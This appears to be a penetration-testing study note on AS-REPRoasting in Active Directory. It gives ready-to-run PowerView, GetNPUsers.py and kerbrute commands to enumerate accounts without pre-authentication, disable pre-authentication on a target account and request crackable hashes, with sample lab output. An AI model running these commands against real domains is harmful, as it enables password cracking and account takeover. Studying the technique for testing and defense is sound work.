## what is it ?
When `pre-authentication` isn't required, we can request a TGT of any user, this TGT come with other message that contain `TGS session key` that is needed to use the TGT but this message is encrypted using user password so we need to crack this message to get the `TGS session key` and be able to use the `TGT`. success depends on the user having a relatively weak password.

`AS-REPRoasting` is similar to `Kerberoasting` but involves attacking `AS-REP` instead of `TGS-REP`.

---
## Targeted AS-REPRoasting
We can perform AS-REP rosting even if it require pre-authentication, Suppose an attacker has `GenericWrite` or `GenericAll` permissions over an account. In that case, they can enable this attribute and obtain the `AS_REP` ticket for offline cracking to recover the account's password before disabling it again.

---
## Commands
### windows
#### PowerShell Enumeration of accounts with DONT_REQ_PREAUTH
```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
objectsid             : S-1-5-21-1870146311-1183348186-593267556-1109                                                   samaccountname        : amber.smith
codepage              : 0                                                                                               samaccounttype        : USER_OBJECT                                                                                     accountexpires        : NEVER
countrycode           : 0 
whenchanged           : 4/20/2023 9:24:40 PM                                                                            instancetype          : 4 
usncreated            : 12626 
objectguid            : 982f19c6-78d1-458a-a148-3bd0eb5b4bd6 
lastlogoff            : 12/31/1600 6:00:00 PM                                                                           objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL                                  dscorepropagationdata : 1/1/1601 12:00:00 AM 
lastlogon             : 4/20/2023 4:57:03 PM 
badpwdcount           : 0 
cn                    : amber.smith                                                                                     useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH 
```
#### Set DONT_REQ_PREAUTH with PowerView
```powershell
Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Rubeus
[[Rubeus]]

---
### Linux

#### AS-REPRoastable Users Enumeration
```sh
GetNPUsers.py inlanefreight.local/pixis
```
Now that we have a list of vulnerable accounts, we can request their hashes in Hashcat's format by adding the `-request` parameter to our command.
```sh
GetNPUsers.py inlanefreight.local/pixis -request           
```

#### Finding Vulnerable Accounts without Authentication
If we do not have credentials on the domain but have a username list, we can still find accounts that do not require pre-authentication. Using `GetNPUsers.py`, we can search for each account inside the file containing the user list to identify if there is a least one account vulnerable to this attack:
```
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

#### Using kerbrute
```sh
kerbrute userenum --dc "$DC" -d "$DOMAIN" usernames.txt --downgrade # Force rc4 encryption
```
---
## Kerbersoting without having creds
if you have those conditions:
- ASReproastable user
- list of users or SPNs
### How it works
There is `sname` parameter when we request ticket, so when we ask for TGT we ask from `sname=krbtgt`, some resercher tried to put `sname` as different SPN or user and he found that KDC will encrypt it using the password of that user SPN or user.